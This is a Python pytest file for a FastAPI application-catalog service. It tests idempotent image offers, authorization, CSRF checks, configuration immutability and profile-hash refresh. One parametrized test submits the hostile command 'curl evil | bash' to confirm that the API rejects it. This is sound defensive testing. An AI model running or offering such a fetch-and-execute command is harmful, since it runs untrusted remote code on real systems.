"""Catalog changes are atomic offers, never instance creation or preparation."""
from copy import deepcopy

from fastapi import HTTPException
import pytest
from sqlalchemy import select,func

from app.config import get_settings
from app.models.configuracion_despliegue import ConfiguracionDespliegue
from app.models.recurso_template import RecursoTemplate
from app.models.compromiso_capacidad import CompromisoCapacidad
from app.models.identidad_infraestructura import IdentidadInfraestructura
from app.models.pedido import Pedido
from app.schemas.aplicacion import AgregarAplicacion,RevisarAplicacion
from app.services import configuracion_despliegue_service as catalog
from tests.test_admision_aplicaciones_011 import app_order,approve,perfil_capacidad,red_aplicaciones_011,profile_entry


@pytest.fixture
def catalog_image(app_order,monkeypatch):
    calls=[]
    async def resolver(value,*,architecture):
        calls.append(value)
        return {'repositorio':'docker.io/university/campus-demo','tag_original':'course',
            'manifest_digest':'sha256:'+'a'*64,'index_digest':None,'config_digest':'sha256:'+'b'*64,
            'os':'linux','arquitectura':architecture,'volumes':['/data'],'registry_profile_id':'docker-hub',
            'registry_profile_sha256':catalog.registry_hash(get_settings().application_registry_profiles['docker-hub'])}
    monkeypatch.setattr(catalog,'resolve_image',resolver)
    return calls,resolver


def request_body():
    return {'nombre':'Campus propio','imagen':'university/campus-demo:course','puerto':8080,'persistencia':['/data']}


async def test_admin_adds_offer_once_without_guest_capacity_or_manual_preparation(client,db,auth_admin,app_order,catalog_image,proxmox):
    calls,_=catalog_image
    before=await db.scalar(select(func.count()).select_from(ConfiguracionDespliegue))
    response=await client.post('/templates/aplicaciones',headers=auth_admin|{'Idempotency-Key':'own-image'},json=request_body())
    assert response.status_code==201,response.text
    assert response.json()['oferta_disponible'] and response.json()['estado_presentacion']=='Disponible para solicitar'
    assert response.json()['tamanos_permitidos']==['medium'] and response.headers['cache-control']=='no-store'
    again=await client.post('/templates/aplicaciones',headers=auth_admin|{'Idempotency-Key':'own-image'},json=request_body())
    assert again.status_code==201 and again.json()==response.json() and len(calls)==1
    assert await db.scalar(select(func.count()).select_from(ConfiguracionDespliegue))==before+1
    assert await db.scalar(select(func.count()).select_from(CompromisoCapacidad))==0
    assert await db.scalar(select(func.count()).select_from(IdentidadInfraestructura))==0
    assert not proxmox.creados
    listing=(await client.get('/templates/',headers=auth_admin)).json()
    assert any(row['id']==response.json()['id'] and row['oferta_disponible'] for row in listing)


@pytest.mark.parametrize('bad',['teacher','csrf','command','private-value','missing-volume','blocked-profile'])
async def test_invalid_or_unauthorized_add_has_no_visible_draft(client,db,auth_admin,auth_catedra,app_order,catalog_image,bad):
    calls,_=catalog_image;body=request_body();headers=auth_admin|{'Idempotency-Key':'invalid-'+bad}
    before=await db.scalar(select(func.count()).select_from(RecursoTemplate))
    if bad=='teacher':headers=auth_catedra|{'Idempotency-Key':'invalid-teacher'}
    if bad=='csrf':headers={k:v for k,v in headers.items() if k.lower()!='x-csrf-token'}
    if bad=='command':body['command']='curl evil | bash'
    if bad=='private-value':body['variables']={'PASSWORD':'private-should-never-be-stored'}
    if bad=='missing-volume':body['persistencia']=[]
    if bad=='blocked-profile':app_order.entry.update(estado='bloqueado',motivo_codigo='ADMIN_BLOCKED')
    response=await client.post('/templates/aplicaciones',headers=headers,json=body)
    assert response.status_code in {403,409,422},response.text
    assert 'private-should-never-be-stored' not in response.text
    assert await db.scalar(select(func.count()).select_from(RecursoTemplate))==before
    if bad in {'teacher','csrf','command','private-value','blocked-profile'}:assert not calls


async def test_revision_keeps_approved_order_and_previous_configuration_immutable(client,db,admin,auth_admin,app_order,catalog_image):
    app=app_order;old_id=app.config.id;old_doc=deepcopy(app.config.documento)
    await approve(db,admin,app)
    approved=deepcopy(app.pedido.asignacion_snapshot)
    body={key:value for key,value in request_body().items() if key!='nombre'}|{'revision_esperada':app.template.revision}
    response=await client.post(f'/templates/{app.template.id}/configuracion',headers=auth_admin|{'Idempotency-Key':'replace-image'},json=body)
    assert response.status_code==200,response.text
    assert response.json()['revision']==2 and response.json()['configuracion_id']!=str(old_id)
    db.expire_all();old=await db.get(ConfiguracionDespliegue,old_id)
    assert old.documento==old_doc
    pedido=await db.scalar(select(Pedido))
    assert pedido.asignacion_snapshot==approved and pedido.configuracion_despliegue_id==old_id
    stale=await client.post(f'/templates/{response.json()["id"]}/configuracion',headers=auth_admin|{'Idempotency-Key':'stale-revision'},json=body)
    assert stale.status_code==409


async def test_profile_rechecked_after_external_validation_before_commit(db,admin,app_order,catalog_image):
    calls,resolver=catalog_image
    before=await db.scalar(select(func.count()).select_from(ConfiguracionDespliegue))
    async def blocked(*args,**kwargs):
        assert not db.in_transaction()
        result=await resolver(*args,**kwargs)
        app_order.entry.update(estado='bloqueado',motivo_codigo='ADMIN_BLOCKED')
        return result
    with pytest.raises(HTTPException):await catalog.change(db,actor=admin,body=request_body(),clave='profile-changed',resolver=blocked)
    await db.rollback()
    assert await db.scalar(select(func.count()).select_from(ConfiguracionDespliegue))==before


async def test_outdated_profile_hash_marks_offer_as_requiring_update_with_one_click_payload(client,db,auth_admin,app_order,catalog_image):
    from hashlib import sha256
    from app.schemas.application_profiles import canonical
    app=app_order
    # Simulate profile hash update (e.g. new policy_bundle_sha256 on same profile revision)
    new_entry=deepcopy(app.entry)
    new_entry['definition']['policy_bundle_sha256']='f'*64
    new_entry['sha256']=sha256(canonical(new_entry['definition'])).hexdigest()
    new_entry['validacion']['perfil_sha256']=new_entry['sha256']
    get_settings().application_profiles['docker-ubuntu24:1']=new_entry

    listing=(await client.get('/templates/',headers=auth_admin)).json()
    item=next(row for row in listing if row['id']==app.template.id)
    assert item['oferta_disponible'] is False
    assert item['requiere_actualizar_perfil'] is True
    assert item['configuracion_actualizacion'] is not None
    assert item['configuracion_actualizacion']['revision_esperada']==app.template.revision

    updated=await client.post(
        f"/templates/{app.template.id}/configuracion",
        headers=auth_admin|{'Idempotency-Key':'one-click-profile-refresh'},
        json=item['configuracion_actualizacion'],
    )
    assert updated.status_code==200,updated.text
    assert updated.json()['oferta_disponible'] is True
    assert updated.json()['requiere_actualizar_perfil'] is False

